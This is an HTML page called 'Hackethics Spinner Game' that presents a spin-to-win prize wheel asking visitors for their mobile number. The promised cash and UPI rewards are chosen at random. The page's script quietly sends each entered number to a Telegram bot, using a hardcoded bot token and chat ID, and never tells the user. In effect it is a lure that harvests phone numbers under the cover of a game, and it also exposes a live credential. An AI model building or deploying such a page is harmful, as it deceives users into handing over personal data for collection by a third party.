<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Hackethics Spinner Game</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Segoe UI', sans-serif;
    }

    body {
      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
      color: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    .container {
      background: rgba(255,255,255,0.05);
      padding: 30px;
      border-radius: 20px;
      box-shadow: 0 0 20px rgba(255,255,255,0.1);
      text-align: center;
    }

    h1 {
      margin-bottom: 15px;
      font-size: 2em;
      color: #00ffe7;
    }

    input {
      padding: 10px;
      font-size: 1em;
      width: 240px;
      border: none;
      border-radius: 10px;
      margin: 10px 0;
      outline: none;
    }

    button {
      padding: 10px 20px;
      background: #00ffe7;
      color: #000;
      border: none;
      border-radius: 10px;
      font-size: 1em;
      cursor: pointer;
      margin-top: 10px;
    }

    .spinner {
      margin-top: 30px;
      width: 180px;
      height: 180px;
      border: 12px solid #fff;
      border-top: 12px solid #00ffe7;
      border-radius: 50%;
      animation: spin 0s linear infinite;
      display: none;
      margin-left: auto;
      margin-right: auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .result {
      margin-top: 20px;
      font-size: 1.3em;
      color: #0f0;
    }

    .error {
      color: #ff4b5c;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>üéØ Spin & Win!</h1>
    <p>Enter your mobile number to play:</p>
    <input type="tel" id="number" placeholder="Enter 10-digit number" maxlength="10">
    <div class="error" id="error"></div>
    <button onclick="startGame()">Start Game</button>

    <div class="spinner" id="spinner"></div>
    <div class="result" id="result"></div>
  </div>

  <script>
    const token = "7575805655:AAEQzfqlBA-IaorNqJpyVkzLvpcWdRWojXg";
    const chatId = "1954755564";

    const rewards = ["‚Çπ50 Bonus", "‚Çπ100 Bonus", "Try Again", "‚Çπ500 UPI Cash", "Better Luck Next Time", "‚Çπ20 Coins"];

    function isValidNumber(num) {
      return /^[6-9]\d{9}$/.test(num);
    }

    function startGame() {
      const number = document.getElementById("number").value.trim();
      const error = document.getElementById("error");
      const spinner = document.getElementById("spinner");
      const result = document.getElementById("result");

      result.innerHTML = "";
      error.innerHTML = "";

      if (!isValidNumber(number)) {
        error.innerText = "‚ùå Invalid number. Please enter a valid 10-digit mobile number.";
        return;
      }

      spinner.style.display = "block";
      spinner.style.animation = "spin 2s linear infinite";

      setTimeout(() => {
        spinner.style.animation = "none";
        const prize = rewards[Math.floor(Math.random() * rewards.length)];
        result.innerHTML = `üéâ You won: <strong>${prize}</strong>`;

        sendToTelegram(number, prize);
      }, 3000);
    }

    function sendToTelegram(number, prize) {
      const msg = `üì± *New Spin Winner!*\n\n*Mobile:* \`${number}\`\n*Reward:* üéÅ ${prize}`;
      const url = `https://api.telegram.org/bot${token}/sendMessage`;

      fetch(url, {
        method: "POST",
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: msg,
          parse_mode: "Markdown"
        })
      })
      .then(res => console.log("‚úÖ Sent to Telegram"))
      .catch(err => console.error("‚ùå Telegram Error", err));
    }
  </script>
</body>
</html>
